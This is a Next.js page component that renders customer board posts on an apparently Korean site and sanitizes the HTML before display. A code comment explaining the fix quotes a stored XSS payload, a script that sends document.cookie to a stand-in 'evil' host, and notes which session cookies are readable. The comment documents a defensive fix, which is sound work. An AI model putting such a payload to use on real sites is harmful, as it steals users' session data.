import Link from 'next/link';
import { ChevronRight } from 'lucide-react';
import { getMenuBySlug, getPostById } from '@/lib/api/menus';
import { notFound } from 'next/navigation';
import CommentSection from '@/components/comments/CommentSection';
import PostActions from '@/components/PostActions';
import { sanitizeHtml } from '@/lib/html/sanitizeHtml';

interface Props {
  slug: string;
  postId: string;
  lang: string;
}

export default async function PostDetailPage({ slug, postId, lang }: Props) {
  const [menu, post] = await Promise.all([getMenuBySlug(slug), getPostById(postId)]);
  if (!menu || !post) notFound();

  const menuTitle = menu.title?.[lang] || menu.title?.kr || menu.title?.en || '';

  return (
    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 animate-in fade-in duration-500">
      <div className="flex items-center text-[11px] font-semibold text-neutral-400 mb-8 tracking-widest flex-wrap gap-y-1">
        <Link href={`/${lang}`} className="hover:text-black transition-colors">HOME</Link>
        <ChevronRight className="w-3 h-3 mx-2" />
        <Link href={`/${lang}/menus/${slug}`} className="hover:text-black transition-colors">{menuTitle}</Link>
        <ChevronRight className="w-3 h-3 mx-2" />
        <span className="text-brand-ink">{lang === 'kr' ? '게시글' : 'Post'}</span>
      </div>

      <article>
        <div className="border-b-2 border-[#111] pb-6 mb-8">
          <div className="flex items-center gap-2 mb-3">
            {post.is_admin_post && <span className="px-2 py-0.5 text-[10px] font-bold bg-brand-ink text-white rounded">공지</span>}
          </div>
          <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight text-brand-ink mb-4">{post.title}</h1>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4 text-xs text-neutral-400">
              <span>{post.author_name}</span>
              <span>{new Date(post.created_at).toLocaleDateString('ko-KR', { year: 'numeric', month: 'long', day: 'numeric' })}</span>
            </div>
            <PostActions postId={postId} authorId={post.author_id} slug={slug} lang={lang} />
          </div>
        </div>

        {post.content ? (
          <div
            className="detail-body min-h-[200px]"
            // 2026-06-29: customer board posts are authored via the
            // RichEditor (Tiptap) which serializes to HTML, then stored
            // in `posts.content` and rendered here. This page was the
            // ONLY render site that didn't sanitize — a customer could
            // post `<script>document.location='https://evil/?c='+document.cookie</script>`
            // and every other viewer would execute it. `kokkok_auth` /
            // `kokkok_admin_auth` are non-httpOnly so document.cookie
            // can read them — real session-mirror data leak. The
            // Cognito tokens are httpOnly (safe) but redirect-based
            // phishing still works (overwrite document.location to a
            // fake login page). MenuPage + reviews + CMS pages already
            // sanitize via this same helper.
            dangerouslySetInnerHTML={{ __html: sanitizeHtml(post.content) }}
          />
        ) : (
          <div className="min-h-[200px] text-sm text-neutral-400">
            {lang === 'kr' ? '내용이 없습니다.' : 'No content.'}
          </div>
        )}
      </article>

      <div className="mt-12 pt-8 border-t border-neutral-200">
        <CommentSection postId={postId} lang={lang} />
      </div>

      <div className="mt-12 pt-8 border-t border-neutral-100">
        <Link href={`/${lang}/menus/${slug}`} className="inline-flex items-center gap-2 text-sm text-neutral-500 hover:text-black transition-colors">
          ← {lang === 'kr' ? '목록으로' : 'Back to list'}
        </Link>
      </div>
    </div>
  );
}
